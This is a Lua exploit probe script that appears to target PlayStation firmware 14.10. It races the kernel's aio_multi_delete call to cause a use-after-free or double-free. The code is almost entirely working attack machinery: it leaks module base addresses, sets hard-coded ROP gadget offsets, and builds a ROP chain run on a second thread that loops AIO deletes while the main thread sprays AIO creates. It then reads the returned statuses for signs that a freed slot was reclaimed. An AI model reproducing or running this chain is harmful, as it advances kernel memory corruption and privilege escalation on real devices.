-- CRASH_CLASS: HIGH
-- PROBE 540a: aio_multi_delete TOCTOU race — ROP deleter vs Lua sprayer
--
-- Context: Coixao (Oct 24) says aio_multi_delete drops its lock between
-- two lookups (~5 instructions). A racing create can reclaim the freed
-- slot; delete then frees sub-objects of the NEW object → UAF/double-free.
-- Sony added a generation-ID revalidation in 14.20 to kill this race.
-- On 14.10 the fix is absent — the window should be open.
--
-- 584a tried Lua threads → process dies when two Lua threads call AIO
-- concurrently (even with disjoint IDs). Fix: ROP child via thr_new(455)
-- does the tight delete loop. Lua main thread does the spray (669 submit).
-- Both run as real OS threads — true concurrency.
--
-- Detection: check delete statuses for 0x80020010 (swap signature),
-- anomalous states, or kernel panic. Health-check after each round.

print("=== PROBE 540a: AIO DELETE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc670 = make_syscall(670)

local pid = to_num(sc20())
print("pid=" .. pid)

-- ============================================================
-- Module bases
-- ============================================================
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

-- Gadgets
local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local pop_rcx_ret     = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- Phase A: AIO init + open urandom + initial batch
-- ============================================================
print("[A] AIO init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_o, urand_fd = pcall(function()
    return make_syscall(5)(uint64(to_num(urand_path)), Z, Z)
end)
urand_fd = ok_o and to_num(urand_fd) or -1
print("  urandom fd=" .. urand_fd)

-- AIO request helpers (Lua side)
local reqs_buf = memory.alloc(0x30)
local data_buf = memory.alloc(0x100)
local res_buf  = memory.alloc(0x100)
local ids_out  = memory.alloc(0x200)
local poll_st  = memory.alloc(0x200)
local del_st   = memory.alloc(0x200)

local function fill_req(base, fd)
    zero(base, 0x28)
    wq(base + 0x00, Z)
    wq(base + 0x08, uint64(16))
    wq(base + 0x10, uint64(to_num(data_buf)))
    wq(base + 0x18, uint64(to_num(res_buf)))
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function aio_submit_one(fd)
    fill_req(reqs_buf, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_poll_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0)
    pcall(function() sc664(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)), Z) end)
    return safe_rd(st_p) or 0
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

-- ============================================================
-- Phase B: set up shared memory and ROP deleter
-- ============================================================

-- Layout:
-- shared+0x000: barrier flag (child spins until this = 1)
-- shared+0x004: child done flag (child writes BATCH_COUNT here)
-- shared+0x008: child anomaly count
-- shared+0x010: delete IDs array (BATCH_COUNT * 4 bytes)
-- shared+0x210: delete status array (BATCH_COUNT * 4 bytes)

local BATCH_COUNT = 32
local SPRAY_ITERS = 200
local ROUNDS = 4

local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x1000)
print("  shared=" .. q(shared))

-- Fake TCB for child thread
local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- Build deleter ROP chain: spin on barrier, then loop delete BATCH_COUNT ids
local function build_deleter(ids_addr, status_addr, barrier_addr, done_addr, count)
    local map_size = 0x200000
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + 0x100000
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    -- sysarch(165, SET_FSBASE=129, &fake_tcb) for TLS
    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    -- No barrier spin needed: Lua main sets up and launches thr_new,
    -- then immediately starts spraying. By the time child's sysarch
    -- completes, Lua is already submitting. The scheduling delay
    -- IS the synchronization — both threads race naturally.

    -- Delete loop: call 662(ids_addr, count, status_addr) repeatedly.
    -- We run SPRAY_ITERS iterations of delete over the same IDs.
    -- Most will return 0x80020003 (already deleted), but the first pass
    -- should hit live IDs, and if a create lands in the gap, we get 0x80020010.
    -- Same status_addr each time — last iteration's statuses survive for checking.
    local u_ids = uint64(ids_addr)
    local u_status = uint64(status_addr)
    local u_count = uint64(count)
    local u_662 = uint64(662)
    for iter = 0, SPRAY_ITERS - 1 do
        emit(pop_rax_ret); emit(u_662)
        emit(pop_rdi_ret); emit(u_ids)
        emit(pop_rsi_ret); emit(u_count)
        emit(pop_rdx_ret); emit(u_status)
        emit(fn_addr)
    end

    -- Store done marker
    emit(pop_rax_ret); emit(uint64(SPRAY_ITERS))
    emit(pop_rdi_ret); emit(uint64(done_addr))
    emit(mov_rdi_rax_ret)

    -- thr_exit(431, 0)
    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    -- thr_param
    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(0x100008))

    return tp, offset
end

-- ============================================================
-- Phase C: race rounds
-- ============================================================
print("")
print("[B] Race: " .. ROUNDS .. " rounds, batch=" .. BATCH_COUNT .. " spray=" .. SPRAY_ITERS)

local total_anomalies = 0
local total_swaps = 0
local total_health_fail = 0

for round = 1, ROUNDS do
    print(string.format("\n[R%d] Creating %d AIO requests...", round, BATCH_COUNT))

    -- Create a batch of AIO requests
    local created_ids = {}
    local created_ok = 0
    for i = 1, BATCH_COUNT do
        local rv, id = aio_submit_one(urand_fd)
        if rv == 0 and id > 0 then
            created_ids[i] = id
            created_ok = created_ok + 1
        else
            created_ids[i] = 0
        end
    end
    print(string.format("  created=%d/%d", created_ok, BATCH_COUNT))

    if created_ok < 8 then
        print("  TOO FEW — skipping round")
    else
        -- Wait for completion
        for i = 1, BATCH_COUNT do
            if created_ids[i] > 0 then
                aio_poll_one(created_ids[i])
            end
        end

        -- Write IDs into shared memory for the ROP child
        local ids_addr = to_num(shared) + 0x010
        local status_base = to_num(shared) + 0x210
        local barrier_addr = shared
        local done_addr = shared + 4

        zero(shared, 0x010)
        for i = 1, BATCH_COUNT do
            wd(shared + 0x010 + (i-1) * 4, created_ids[i] or 0)
        end
        -- Pre-fill status with sentinel so we can tell written-0 from untouched
        for i = 0, BATCH_COUNT - 1 do
            wd(status_base + i * 4, 0x77777777)
        end

        -- ROP child writes all statuses to status_base (same buffer each iter,
        -- overwriting). The last iteration's statuses survive for checking.
        local tp, chain_sz = build_deleter(ids_addr, status_base,
            to_num(barrier_addr), to_num(done_addr), BATCH_COUNT)
        print(string.format("  chain=%dB", chain_sz))

        -- Set barrier = 1 (child starts immediately after sysarch)
        wd(barrier_addr, 1)

        -- Launch deleter child AND start Lua spray simultaneously
        pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

        -- Lua spray: create new AIO requests as fast as possible
        local spray_created = 0
        local spray_ids = {}
        for s = 1, SPRAY_ITERS do
            local rv, id = aio_submit_one(urand_fd)
            if rv == 0 and id > 0 then
                spray_created = spray_created + 1
                spray_ids[spray_created] = id
            end
        end
        print(string.format("  spray created=%d/%d", spray_created, SPRAY_ITERS))

        -- Wait for child to finish (max 10s)
        local ts = memory.alloc(16)
        wq(ts, uint64(1)); wq(ts + 8, Z)
        for w = 1, 10 do
            local done_val = safe_rd(done_addr)
            if done_val and done_val > 0 then break end
            pcall(function() sc240(uint64(to_num(ts)), Z) end)
        end

        local child_done = safe_rd(done_addr) or 0
        print(string.format("  child done=%d", child_done))

        -- Check last-written status page for anomalies
        -- Expected: 0 (success on first delete) or 0x80020003 (already deleted)
        -- Interesting: 0x80020010 (swap signature — reallocated slot detected)
        -- 0x77777777 = sentinel (kernel never wrote this slot)
        local round_anomalies = 0
        local round_swaps = 0
        local status_summary = {}
        for i = 0, BATCH_COUNT - 1 do
            local st = safe_rd(status_base + i * 4) or 0
            if st == 0x80020010 then
                round_swaps = round_swaps + 1
                round_anomalies = round_anomalies + 1
                if round_swaps <= 5 then
                    print(string.format("  *** SWAP: slot %d status=0x%08X ***", i, st))
                end
            elseif st ~= 0 and st ~= 0x80020003 and st ~= 0x77777777 then
                round_anomalies = round_anomalies + 1
                if round_anomalies <= 10 then
                    print(string.format("  UNUSUAL: slot %d status=0x%08X", i, st))
                end
                if not status_summary[st] then status_summary[st] = 0 end
                status_summary[st] = status_summary[st] + 1
            end
        end

        -- Health check: can we still create/poll/delete normally?
        local h_rv, h_id = aio_submit_one(urand_fd)
        local health_ok = true
        if h_rv ~= 0 or h_id == 0 then
            health_ok = false
        else
            local h_st = aio_poll_one(h_id)
            local h_dr, h_ds = aio_delete_one(h_id)
            local h_dr2, h_ds2 = aio_delete_one(h_id)
            if h_st ~= 3 or h_dr ~= 0 or h_ds ~= 0 or h_dr2 ~= 0 or h_ds2 ~= 0x80020003 then
                health_ok = false
                print(string.format("  HEALTH FAIL: st=%X d1=%d/%X d2=%d/%X",
                    h_st, h_dr, h_ds, h_dr2, h_ds2))
            end
        end
        if not health_ok then total_health_fail = total_health_fail + 1 end

        -- Clean up spray IDs
        for _, sid in ipairs(spray_ids) do
            pcall(function() aio_delete_one(sid) end)
        end

        total_anomalies = total_anomalies + round_anomalies
        total_swaps = total_swaps + round_swaps
        print(string.format("  R%d: anomalies=%d swaps=%d health=%s",
            round, round_anomalies, round_swaps, health_ok and "OK" or "FAIL"))

        -- Print unique statuses if any
        for st, cnt in pairs(status_summary) do
            print(string.format("  status 0x%08X x%d", st, cnt))
        end
    end
end

-- ============================================================
-- Summary
-- ============================================================
print("")
local pid2 = to_num(sc20())
print(string.format("TOTAL: rounds=%d anomalies=%d swaps=%d health_fails=%d",
    ROUNDS, total_anomalies, total_swaps, total_health_fail))
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 540a DONE ===")
